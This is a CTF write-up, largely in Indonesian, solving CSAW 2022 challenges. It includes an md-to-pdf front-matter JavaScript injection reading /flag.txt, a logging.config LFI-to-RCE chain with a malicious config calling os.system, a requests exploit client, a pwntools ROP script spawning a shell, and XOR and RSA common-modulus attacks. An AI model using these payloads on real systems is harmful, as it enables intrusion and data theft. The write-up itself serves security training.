# My little website
```
---js
{
    css: `body::before { content: "${require('fs').readFileSync('/flag.txt', 'base64')}"; display: block }`,
}
---
```

Reference: https://github.com/simonhaenisch/md-to-pdf/issues/99 
Somehow if i encode it with utf-8 it's not visible? so i encoded it with base64.

![](Pasted%20image%2020220912170611.png)

![](Pasted%20image%2020220912170634.png)

![](Pasted%20image%2020220912170647.png)

# word wide web
Source dari current page berisi words atau kata2, tapi ada salah satu word yg redirect ke link lainnya (karena words ini bener bener bbanyak, jadi susah kalo diliat pake mata secara polos), word yg punya redirect bakal ngasih kita page yang sama berisi words dengan sistem yg sama. ada juga cookies buat nentuin posisi chain url kita.

![](Pasted%20image%2020220912170726.png)

![](Pasted%20image%2020220912170742.png)

Ckup brute force kyk diatas

# Good Intention
## simple explanation
```python
@api.route('/log_config', methods=['POST'])
@login_required
def log_config():
    if not request.is_json:
        return response('Missing required parameters!'), 401

    data = request.get_json()
    file_name = data.get('filename', '') 
    
    print('testing...')
    logging.config.fileConfig(f"{current_app.config['UPLOAD_FOLDER']}/conf/{file_name}")

    return response(data)
```

Fungsi ini untuk mengganti configurasi dari module logging di python, dan ini vulnerable dengan LFI, karena itu kita bisa mengubah konfigurasinya, dan mendapatkan rce melalui eval() di modul logging.

Ada beberapa restriksi yang membuat challenge ini bertamah susah yaitu:
1. kita hanya bisa mendownload file yang ada di folder /app/application/static/images, karena fungsi secure_filename().
2. file yang kita download harus berada di database. Untuk lebih lengkapnya, bisa dilihat di fungsi download_image() di router.py

Rencana mendapatkan RCE:

step 1:
- register user
- login user
- upload sebuah file ( disini saya beri nama flag.txt)
- dapatkan nama file tersebut menggunakan fungsi gallery

step 2:
- siapkan konfigurasi logging yang berisi payload RCE (disini saya beri nama attacker.conf):
contoh

```
[loggers]
keys=root,simpleExample

[handlers]
keys=consoleHandler

[formatters]
keys=simpleFormatter

[logger_root]
handlers=consoleHandler

[logger_simpleExample]
level=DEBUG
handlers=consoleHandler
qualname=simpleExample
propagate=0

[handler_consoleHandler]
class=__import__('os').system('cat /flag.txt > /app/application/static/images/bbbcdccab94c74b2bec5f8a18880aa/flag.txt_530af9d4799b0af640df')
level=DEBUG
formatter=simpleFormatter
args=(sys.stdout,)

[formatter_simpleFormatter]
format=%(asctime)s - %(name)s - %(levelname)s - %(message)s
```

> note: untuk "bbbcdccab94c74b2bec5f8a18880aa/flag.txt_530af9d4799b0af640df" kalian bisa ganti dengan nama file yang tadi kita dapat melalui fungsi gallery

step 3:
- upload file konfigurasi yang mengandung RCE yang tadi kita buat menggunakan fungsi upload()
- dapatkan nama file dengan menggunakan fungsi gallery() 

step 4:
- siapkan kedua nama file yang tadi kita dapat dari fungsi galery()
- gunakan lfi dari fungsi log_config() untuk mengubah konfigurasi menjadi konfigurasi yang kita upload tadi, contoh:

```python
a.log_config(filename=f"../images/{mal_conf}") # ganti {mal_conf} dengan nama konfigurasi yang tadi kita dapatkan dari fungsi gallery()
```

- terakhir kita tinggal download saja flagnya menggunakan fungsi download_image(), contoh:

```python
a.download_image(file=f"{flag_txt}") # ganti {flag_txt} dengan nama file yang tadi kita kirimkan di awal.
```

final payload:

```python
import requests
import json

URL = "http://web.chal.csaw.io:5012"


class API:
    def __init__(self, url=URL):
        self.requests = requests.Session()
        self.url = url

    def login(self, username, password):
        r = self.requests
        url = self.url
        req = r.post(
            f'{url}/api/login',
            json={
                'username': username,
                'password': password,
            }
        )
        return req.text

    def register(self, username, password):
        r = self.requests
        url = self.url
        req = r.post(
            f'{url}/api/register',
            json={
                'username': username,
                'password': password,
            }
        )
        return req.text

    def gallery(self):
        r = self.requests
        url = self.url
        req = r.get(
            f'{url}/api/gallery',
        )
        return req.text

    def download_image(self, file):
        r = self.requests
        url = self.url
        req = r.get(
            f'{url}/api/download_image',
            params={
                'file': file,
            }
        )
        return req.text

    def upload(self, file, filename):
        r = self.requests
        url = self.url
        req = r.post(
            f'{url}/api/upload',
            files={
                'file': open(file, 'rb')
            },
            data={
                'label': filename
            }
        )
        return req.text

    def log_config(self, filename):
        r = self.requests
        url = self.url
        req = r.post(
            f'{url}/api/log_config',
            json={
                'filename': filename,
            },
        )
        return req.text

    def run_command(self, command):
        r = self.requests
        url = self.url
        req = r.post(
            f'{url}/api/run_command',
            json={
                'filename': command,
            },
        )
        return req.text

a = API()

user = 'dimas123'

# step 1
# print(a.register(user, 'dimas123'))
# print(a.login(user, 'dimas123'))
# print(a.upload(file='empty', filename='flag.txt'))
# flag_txt = json.loads(a.gallery())['message'][0]
# print(flag_txt)

# step 2: change the directory in attacker.conf with flag_txt
'''
contoh:
class=__import__('os').system('cat /flag.txt > /app/application/static/images/{change here}')
'''

# step 3
# print(a.login(user, 'dimas123'))
# print(a.upload(file='attacker.conf', filename='attacker.conf'))
# mal_conf = json.loads(a.gallery())['message'][1]
# print(mal_conf)

# step 4
# print(a.login(user, 'dimas123'))
# mal_conf = json.loads(a.gallery())['message'][1]
# flag_txt = json.loads(a.gallery())['message'][0]
# print(a.log_config(filename=f"../images/{mal_conf}"))
# print(a.download_image(file=f"{flag_txt}"))
```

> Note: payloadnya semiautomatis, jadi perlu di uncomment step by step.

# Refenrence: 
- https://github.com/raj3shp/python-logging.config-exploit
- https://docs.python.org/3/library/logging.config.html

# ezROP
leak address di got menggunakan plt.puts 

```python
from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys

# patch with: pwninit
BINARY = "ezROP_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"

# copy libc.so.6 from docker container
# docker cp --follow-link ezrop:/home/ctf/lib/x86_64-linux-gnu/libc.so.6 ./
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.31.so', checksec=False)


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script):
        if not args.RMT:
            attach(self.p, script)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"My friend, what's your name?", content)

    def leak(self, address):
        '''
        leak address menggunakan plt.puts
        '''
        p = self.p
        pay = b''
        pay += b'\x00'
        pay += cyclic(120-len(pay))
        pay += pack("<Q", ROP(exe).find_gadget(['pop rdi', 'ret'])[0])
        pay += pack("<Q", address)
        pay += pack("<Q", exe.plt['puts'])
        pay += pack("<Q", exe.sym['main'])
        self.send(pay)
        p.recvuntil("CSAW'22!\n")
        return p.recvline().strip()


def rp(x): return ROP(libc).find_gadget(x)[0]
def pck(x): return pack("<Q", x)

x, p = init()

x.debug("b *main+40\nc")

# me-leak address dari libc menggunakan plt.puts
libc.address = btl(x.leak(exe.got['printf'])[::-1]) - libc.sym['printf']
log.success("libc.address @ {}".format(hex(libc.address)))


# membuat shell menggunakan system function di libc
pay = b''
pay += b'\x00'
pay += cyclic(120-len(pay))
pay += pck(rp(['pop rdi', 'ret']))
pay += pck(next(libc.search(b'/bin/sh')))
pay += pck(rp(['ret']))
pay += pck(libc.sym['system'])

x.send(pay)

p.interactive()
```

# DockREleakage

extract filenya terus baca file jsonnya ada strng base64 terus decode tapi flagnnya belum lengkap

![](Pasted%20image%2020220912171239.png)

sisa flagnya ada di folder lain

![](Pasted%20image%2020220912171311.png)

soalnya lebih mirip forensic daripada reverse.

# Gotta Crack Them All

coba masukan leaked_password pada service crypto.chal.csaw.io:5002 kemudian akan didapatkan password yang sudah dienkripsi, kemudian xor password yang sudah dienkripsi dengan leaked_password maka akan didapatkan kunci xor nya. berikut script yang digunakan :

```python
enc = b'kz\xc6\xb9\xd9Du\xcb\x8a\x9e\xe0\x9d\xbeo\xee\x03\xcf\xddd'
pass_leaked = b'Cacturne-Grass-Dark'

key = []
for (e, p) in zip(enc, pass_leaked):
    key.append(e ^ p)
```

setelah itu gunakan key tersebut untuk dekripsi semua string yang ada di encrypted_passwords.txt, berikut script yang digunakan :

```python
with open('encrypted_passwords.txt', 'rb') as f:
    enc_strings = f.read()
enc_strings = enc_strings.split(b'\n')
for i in range(len(enc_strings)):
    res = ''
    for (e, key) in zip(enc_strings[i], k):
        res += chr(e^key)
    print(res)
```

maka didapatkan flagnya 1n53cu2357234mc1ph3, namun flag tersebut kurang satu karakter di belakangnya, karena flag terlihat seperti string insecurestreamciphe?, maka saya berasumsi kalau huruf r diganti menjadi angka 2. coba submit flag, ternyata benar

flag:
```
1n53cu2357234mc1ph32
```

# Phi Too Much In Common

diberikan service dimana ada menu ciphertext_info, solve_challenge, dan exit. di sini saya coba pilih menu 1 dan diberikan informasi berupa nilai N, e dan c. sampai di sini belum mendapatkan clue sama sekali, kemudian saya coba pilih menu 1 berulang-ulang dan didapatkan bahwa password dienkripsi dengan menggunakan modulus yang sama. dari sini kita dapat melakukan common modulus attack, untuk langkah-langkah beserta scriptnya bisa dilihat di website berikut https://infosecwriteups.com/rsa-attacks-common-modulus-7bdb34f331a5, berikut script yang digunakan:

```python
from gmpy2 import *

N = 91949595183273178428099249190588369314049882497718300569706360702066801880633083495639346701484688722682627935005464106712661962088368093901475486284576917730892268938968162554526293510456683663381948195413549867940363049453178487182356046364486480691255905467563721614526299753363740654178914538310643708207
e1 = 12031075455812458749146583247559356935117148154601630586028548453147321428293
c1 = 7920008330571809365473955163072949787354253185422551171504687979391730280329621505862579587501275290216263128817757505438366014122611287891099835652711214042667564989519422695378002044666466697726964817112040327646727707594980060507943820101464100611574871978009421469791284706486330289383483102735336270840

N = 91949595183273178428099249190588369314049882497718300569706360702066801880633083495639346701484688722682627935005464106712661962088368093901475486284576917730892268938968162554526293510456683663381948195413549867940363049453178487182356046364486480691255905467563721614526299753363740654178914538310643708207
e2 = 10596444459662248800770719532884943461087370719331994503211631926591323991427
c2 = 2413184220806514991972718832857204016291634961920730640838671162300860225829438379804050128467086299872425493070953558278955758651421265625029795303513496158156770030153285983062841843119425150500731703044934212006422905374225521128166813627165847187744000572711571338077968719208576961847581318536418859122

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise ValueError('Modular inverse does not exist.')
    else:
        return x % m

s1 = modinv(e1,e2)
s2 = (gcd(e1,e2) - e1 * s1) // e2
temp = modinv(c2, N)
m1 = pow(c1,s1,N)
m2 = pow(temp,-s2,N)
print(long_to_bytes((m1 * m2) % N))
```

maka didapatkan password d0nt_reUs3_c0mm0n_m0duLus_iN_RSA, setelah itu pilih menu 2 dan diikuti dengan passwordnya "2 d0nt_reUs3_c0mm0n_m0duLus_iN_RSA" maka diberikan informasi nilai N, d, dan e, kita diminta untuk mendapatkan nilai phi-nya, untuk mendapatkan nilai phi, maka diperlukan nilai p dan q. untuk mendapatkan nilai p dan q disini saya menggunakan script yang saya dapatkan dari write up berikut https://ctftime.org/writeup/18177:

```python
import math

N = 75251245752837869912739332641345299233034372632200413636972697643463470958560028448709252137586441136062434829954540454254372269890499158696988653763951079123583894700740937795145716127430566522251664511364471482822188591668168865509143487449865751629352955813685818608418080033475922188498347381656048091971

e = 12820759589492420543814574295801455393990006323420211849043259806425702866761

d = 23968958331918435879393225018762638895381814056408309127465738405415340360177638272868518745081045089288384894054347648359265661366747229515936550110477845376568850792887155583613518397464906129337872792233954555552247471534883823916676664098358080026539498950885359213037566327020309944456097405191032451961

def find_prime_factors(n,e,d):
    k = e * d - 1
    s = 0 
    t = k
    while t % 2 == 0:
        t = t // 2
        s += 1
    i = s
    a = 2
    while True:
        b = pow(a,t,n)
        if b == 1:
            a = nextprime(a)
            continue
        while i != 1:
            c = pow(b,2,n)
            if c == 1:
                break
            else:
                b = c
                i -= 1
        if b == n - 1:
            a = nextprime(a)
            continue

        p = math.gcd(b-1, n)
        q = n // p
        return p, q

p, q = find_prime_factors(N, e, d)
print((p-1)*(q-1))
```

dan setelah itu pilih menu nomor 2 dan diikuti dengan nilai phi nya "2 \<nilai phi\>" maka akan didapatkan flagnya:

```
flag{aR3nT_U_tH3_RSA_ninJA}
```